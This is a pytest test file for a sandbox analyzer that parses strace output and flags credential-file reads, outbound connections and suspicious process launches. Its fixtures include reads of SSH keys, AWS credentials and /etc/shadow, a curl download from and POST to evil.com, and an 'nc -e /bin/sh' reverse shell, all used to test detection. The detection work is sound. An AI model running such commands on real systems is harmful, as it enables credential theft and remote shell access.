"""Tests for the behavioral sandbox analyzer."""

from __future__ import annotations

import pytest

from agentsift.analyzers.sandbox import (
    SandboxReport,
    parse_strace_output,
    report_to_findings,
)
from agentsift.models import FindingCategory, Severity


# --- strace output parsing tests ---


class TestStraceParser:
    def test_detects_ssh_key_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "ssh-keys"

    def test_detects_aws_credentials_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/home/user/.aws/credentials", O_RDONLY) = 3\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "aws-creds"

    def test_detects_crypto_wallet_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/home/user/.ethereum/keystore/key", O_RDONLY) = 4\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "crypto-wallet"

    def test_detects_browser_data_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/home/user/.mozilla/firefox/profile/cookies.sqlite", O_RDONLY) = 3\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "browser-data"

    def test_detects_proc_self_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 3\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "proc-self"

    def test_detects_etc_shadow_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 1
        assert report.file_accesses[0][2] == "shadow-file"

    def test_ignores_enoent_file_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = -1 ENOENT\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 0

    def test_ignores_normal_file_access(self) -> None:
        strace = (
            '12345 openat(AT_FDCWD, "/usr/lib/python3.12/os.py", O_RDONLY) = 3\n'
        )
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 0

    def test_detects_network_connection(self) -> None:
        strace = (
            '12345 connect(3, {sa_family=AF_INET, sin_port=htons(443), '
            'sin_addr=inet_addr("142.250.80.46")}, 16) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.network_connections) == 1
        assert report.network_connections[0] == ("142.250.80.46", 443)

    def test_ignores_loopback_connection(self) -> None:
        strace = (
            '12345 connect(3, {sa_family=AF_INET, sin_port=htons(8080), '
            'sin_addr=inet_addr("127.0.0.1")}, 16) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.network_connections) == 0

    def test_detects_curl_execution(self) -> None:
        strace = (
            '12345 execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], '
            '["PATH=/usr/bin"]) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.process_executions) == 1
        assert "Downloads from external URL" in report.process_executions[0][1]

    def test_detects_shell_execution(self) -> None:
        strace = (
            '12345 execve("/bin/bash", ["bash", "-c", "cat /etc/passwd"], '
            '["PATH=/usr/bin"]) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.process_executions) == 1
        assert "Shell command execution" in report.process_executions[0][1]

    def test_detects_netcat_execution(self) -> None:
        strace = (
            '12345 execve("/usr/bin/nc", ["nc", "-e", "/bin/sh", "evil.com", "4444"], '
            '["PATH=/usr/bin"]) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.process_executions) == 1
        assert "reverse shell" in report.process_executions[0][1].lower()

    def test_detects_ssh_execution(self) -> None:
        strace = (
            '12345 execve("/usr/bin/ssh", ["ssh", "attacker@evil.com"], '
            '["PATH=/usr/bin"]) = 0\n'
        )
        report = parse_strace_output(strace)
        assert len(report.process_executions) == 1
        assert "SSH/SCP" in report.process_executions[0][1]

    def test_empty_strace_output(self) -> None:
        report = parse_strace_output("")
        assert len(report.file_accesses) == 0
        assert len(report.network_connections) == 0
        assert len(report.process_executions) == 0

    def test_complex_strace_output(self) -> None:
        strace = "\n".join([
            '100 openat(AT_FDCWD, "/usr/lib/python3/os.py", O_RDONLY) = 3',
            '100 openat(AT_FDCWD, "/home/user/.ssh/id_ed25519", O_RDONLY) = 4',
            '100 read(4, "-----BEGIN OPENSSH PRIVATE KEY---", 4096) = 399',
            '100 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.1")}, 16) = 0',
            '100 execve("/usr/bin/curl", ["curl", "-X", "POST", "https://evil.com/exfil"], ["PATH=/usr/bin"]) = 0',
            '100 openat(AT_FDCWD, "/home/user/.aws/credentials", O_RDONLY) = 6',
        ])
        report = parse_strace_output(strace)
        assert len(report.file_accesses) == 2  # ssh + aws
        assert len(report.network_connections) == 1
        assert len(report.process_executions) == 1


# --- Finding generation tests ---


class TestReportToFindings:
    def test_file_access_findings(self) -> None:
        report = SandboxReport(
            file_accesses=[
                ("/home/user/.ssh/id_rsa", "SSH directory access", "ssh-keys"),
            ]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1
        assert findings[0].rule_id == "AS-060"
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].category == FindingCategory.CREDENTIAL_THEFT

    def test_file_access_deduplication(self) -> None:
        report = SandboxReport(
            file_accesses=[
                ("/home/user/.ssh/id_rsa", "SSH directory access", "ssh-keys"),
                ("/home/user/.ssh/id_ed25519", "SSH directory access", "ssh-keys"),
            ]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1  # deduplicated by tag

    def test_proc_self_is_high_not_critical(self) -> None:
        report = SandboxReport(
            file_accesses=[
                ("/proc/self/environ", "Process information leak", "proc-self"),
            ]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    def test_network_connection_findings(self) -> None:
        report = SandboxReport(
            network_connections=[("203.0.113.1", 443)]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1
        assert findings[0].rule_id == "AS-061"
        assert findings[0].severity == Severity.HIGH
        assert findings[0].category == FindingCategory.EXFILTRATION

    def test_network_deduplication(self) -> None:
        report = SandboxReport(
            network_connections=[
                ("203.0.113.1", 443),
                ("203.0.113.1", 80),
            ]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1  # deduplicated by IP

    def test_process_execution_findings(self) -> None:
        report = SandboxReport(
            process_executions=[
                ('execve("/usr/bin/curl", ...)', "Downloads from external URL"),
            ]
        )
        findings = report_to_findings(report)
        assert len(findings) == 1
        assert findings[0].rule_id == "AS-062"
        assert findings[0].severity == Severity.HIGH
        assert findings[0].category == FindingCategory.PRIVILEGE_ESCALATION

    def test_timeout_finding(self) -> None:
        report = SandboxReport(timed_out=True)
        findings = report_to_findings(report)
        assert len(findings) == 1
        assert findings[0].rule_id == "AS-069"
        assert findings[0].severity == Severity.MEDIUM

    def test_empty_report_no_findings(self) -> None:
        report = SandboxReport()
        findings = report_to_findings(report)
        assert len(findings) == 0

    def test_combined_findings(self) -> None:
        report = SandboxReport(
            file_accesses=[
                ("/home/user/.ssh/id_rsa", "SSH directory access", "ssh-keys"),
                ("/home/user/.aws/credentials", "AWS credentials access", "aws-creds"),
            ],
            network_connections=[("10.0.0.1", 8080)],
            process_executions=[
                ('execve("/usr/bin/wget", ...)', "Downloads from external URL"),
            ],
        )
        findings = report_to_findings(report)
        assert len(findings) == 4  # 2 file + 1 network + 1 process
        rule_ids = {f.rule_id for f in findings}
        assert rule_ids == {"AS-060", "AS-061", "AS-062"}
